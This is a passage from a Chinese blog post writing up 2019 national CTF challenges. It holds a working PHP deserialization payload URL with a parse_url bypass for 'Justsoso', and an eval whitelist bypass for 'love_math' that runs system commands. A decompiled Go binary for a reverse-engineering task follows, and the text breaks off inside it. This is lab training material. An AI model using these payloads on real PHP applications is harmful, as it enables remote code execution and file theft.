<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2019国赛部分题目WP - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Justsoso"><span class="toc-text">Justsoso</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#love-math"><span class="toc-text">love_math</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用方法"><span class="toc-text">利用方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过名字可以推断出来这是一个go语言编译的程序"><span class="toc-text">通过名字可以推断出来这是一个go语言编译的程序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag：flag-92094daf-33c9-431e-a85a-8bfbd5df98ad"><span class="toc-text">flag：flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bbvvmm"><span class="toc-text">bbvvmm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-flag-eafd-134g-vp1d-vsdr-v5yg-ai0g-fsdg-g24t-sdfg"><span class="toc-text">flag:flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#your-pwn"><span class="toc-text">your_pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-pwn"><span class="toc-text">baby_pwn</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2019国赛部分题目WP
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-04-25 23:49:42</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>最近过于倒霉！！！！<br><a id="more"></a></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Justsoso"><a href="#Justsoso" class="headerlink" title="Justsoso"></a>Justsoso</h3><p>通过查看源代码发现存在文件包含漏洞，并给出一个提示hint.txt，通过php伪协议可以泄露出来index.php和hint.php<br><img src="https://s2.ax1x.com/2019/04/25/Eezw3F.png" alt> </p>
<p>index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">"file"</span>]; </span></span><br><span class="line"><span class="php">$payload = $_GET[<span class="string">"payload"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">@<span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span></span><br><span class="line"><span class="php">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span></span><br><span class="line"><span class="php">    parse_str($url[<span class="string">'query'</span>],$query);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $payload = unserialize($payload);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">&lt;!--Please test index.php?file=xxx.php --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Please get the source of hint.php--&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>hint.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>    </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;       </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $handle;        </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;         </span></span><br><span class="line"><span class="php">            &#125;          </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"Waking upn"</span>;      </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;           </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle = $handle;       </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;    </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();   </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;    </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;      </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;      </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token;      </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token_flag;         </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;    </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = $file;    </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));      </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;    </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)&#123;     </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;      </span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>);               </span></span><br><span class="line"><span class="php">            &#125;            </span></span><br><span class="line"><span class="php">        &#125;      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>通过代码审计发现，存在两处漏洞</p>
<ol>
<li>通过”///“来绕过parse_url，<a href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">一叶飘零师傅博客上的讲解</a> </li>
<li>通过反序列化漏洞开读取flag.php</li>
</ol>
<p>第二处漏洞利用的时候发现有一个比较，是两个随机数MD5值比较，$token是在我们这边生成的，但是$token_flag实在服务器那边生成的，相等的几率很小的，一开始我用的是爆破法，发现emmmm，不是太理想，后来想起来可以利用变量引用来绕过这个比较</p>
<p>生成payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>    </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;       </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $handle;        </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;         </span></span><br><span class="line"><span class="php">            &#125;          </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"Waking upn"</span>;      </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;           </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Flag();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle-&gt;token = &amp;<span class="keyword">$this</span>-&gt;handle-&gt;token_flag;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle-&gt;file=<span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;    </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();   </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;    </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;      </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;   </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token;      </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token_flag;         </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;    </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = $file;    </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));      </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;    </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)&#123;     </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;      </span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>);               </span></span><br><span class="line"><span class="php">            &#125;            </span></span><br><span class="line"><span class="php">        &#125;      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> Handle();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>payload(需要注意的是handle的属性是private)：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://192.168.0.103///ctf/?file=hint.php&amp;payload=O:6:<span class="number">%22</span>Handle<span class="number">%22</span>:2:&#123;s:14:<span class="number">%22</span><span class="number">%00</span>Handle<span class="number">%00</span>handle<span class="number">%22</span>;O:4:<span class="number">%22</span>Flag<span class="number">%22</span>:3:&#123;s:4:<span class="number">%22</span>file<span class="number">%22</span>;s:8:<span class="number">%22</span>flag.php<span class="number">%22</span>;s:5:<span class="number">%22</span>token<span class="number">%22</span>;s:32:<span class="number">%2207</span>bb5fdef1ee99d35eaccce14f8b5540<span class="number">%22</span>;s:10:<span class="number">%22</span>token_flag<span class="number">%22</span>;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h3><p>题目给出部分源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">//例子 c=20-1 </span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs); </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123; </span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//帮你算出答案 </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>代码审计发现过滤了好多特殊字符，可以利用的函数只能用$whitelist里面的函数，最后我们输入的参数会与echo拼接再调用eval函数执行，如果我们想执行我们想要执行的代码，那么下手点必须在eval的参数里面</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">base_convert:在任意进制之间转换数字，返回一字符串，包含 <span class="built_in">number</span> 以 tobase 进制的表示。<span class="built_in">number</span> 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 <span class="number">2</span> 和 <span class="number">36</span> 之间（包括 <span class="number">2</span> 和 <span class="number">36</span>）。高于十进制的数字用字母 <span class="keyword">a</span>-z 表示，例如 <span class="keyword">a</span> 表示 <span class="number">10</span>，b 表示 <span class="number">11</span> 以及 z 表示 <span class="number">35</span>。</span><br><span class="line">bindec — 二进制转换为十进制</span><br><span class="line">decbin — 十进制转换为二进制</span><br><span class="line">dechex — 十进制转换为十六进制</span><br><span class="line">decoct — 十进制转换为八进制</span><br><span class="line">hexdec — 十六进制转换为十进制</span><br><span class="line">hex2bin转换十六进制字符串为二进制字符串。</span><br></pre></td></tr></table></figure>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>没有过滤$，我们可以通过异或来构造成_GET，虽然过滤了小括号，但是我们用大括号也可以取出来数组里的值<br>payload1<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=<span class="keyword">system</span>&amp;<span class="number">1</span>=whoami&amp;c=<span class="symbol">$</span><span class="built-in">pi</span>=base_convert;<span class="symbol">$</span><span class="built-in">pi</span>=<span class="symbol">$</span><span class="built-in">pi</span>(<span class="number">1109136</span>,<span class="number">10</span>,<span class="number">36</span>)^<span class="symbol">$</span><span class="built-in">pi</span>(<span class="number">53179</span>,<span class="number">10</span>,<span class="number">36</span>);<span class="symbol">$</span>&#123;<span class="symbol">$</span><span class="built-in">pi</span>&#125;&#123;<span class="number">0</span>&#125;(<span class="symbol">$</span>&#123;<span class="symbol">$</span><span class="built-in">pi</span>&#125;&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure></p>
<p>这样的话，我们执行的命令可以利用另一个参数来控制，省去了不必要的长度</p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="通过名字可以推断出来这是一个go语言编译的程序"><a href="#通过名字可以推断出来这是一个go语言编译的程序" class="headerlink" title="通过名字可以推断出来这是一个go语言编译的程序"></a>通过名字可以推断出来这是一个go语言编译的程序</h3><p>载入IDA中发现该程序已经去符号化了，看着很不友好，网上有一个工具叫做golanghelper，可以恢复go程序的符号，那么用这个工具恢复之后，找到main函数（main_main）</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__int64</span> <span class="variable">__fastcall</span> main_main(<span class="variable">__int64</span> a1, <span class="variable">__int64</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">__int64</span> v2; <span class="comment">// r8</span></span><br><span class="line">  <span class="variable">__int64</span> v3; <span class="comment">// r9</span></span><br><span class="line">  <span class="variable">__int64</span> v4; <span class="comment">// r8</span></span><br><span class="line">  <span class="variable">__int64</span> v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="variable">__int64</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="variable">__int64</span> v7; <span class="comment">// rcx</span></span><br><span class="line">  <span class="variable">__int64</span> v8; <span class="comment">// r8</span></span><br><span class="line">  <span class="variable">__int64</span> v9; <span class="comment">// r9</span></span><br><span class="line">  <span class="variable">__int128</span> v10; <span class="comment">// ST00_16</span></span><br><span class="line">  <span class="variable">__int64</span> v11; <span class="comment">// ST18_8</span></span><br><span class="line">  int v12; <span class="comment">// er8</span></span><br><span class="line">  <span class="variable">__int64</span> v13; <span class="comment">// r8</span></span><br><span class="line">  <span class="variable">__int64</span> v14; <span class="comment">// r9</span></span><br><span class="line">  <span class="variable">__int64</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="variable">__int64</span> v16; <span class="comment">// rdx</span></span><br><span class="line">  <span class="variable">__int64</span> v17; <span class="comment">// r8</span></span><br><span class="line">  <span class="variable">__int64</span> v18; <span class="comment">// r9</span></span><br><span class="line">  <span class="variable">__int64</span> v19; <span class="comment">// rdx</span></span><br><span class="line">  <span class="variable">__int64</span> v20; <span class="comment">// r8</span></span><br><span class="line">  <span class="variable">__int64</span> v21; <span class="comment">// r9</span></span><br><span class="line">  <span class="variable">__int64</span> v22; <span class="comment">// r8</span></span><br><span class="line">  <span class="variable">__int64</span> v23; <span class="comment">// r9</span></span><br><span class="line">  <span class="variable">__int64</span> v24; <span class="comment">// [rsp+8h] [rbp-F8h]</span></span><br><span class="line">  <span class="variable">__int64</span> v25; <span class="comment">// [rsp+10h] [rbp-F0h]</span></span><br><span class="line">  char v26; <span 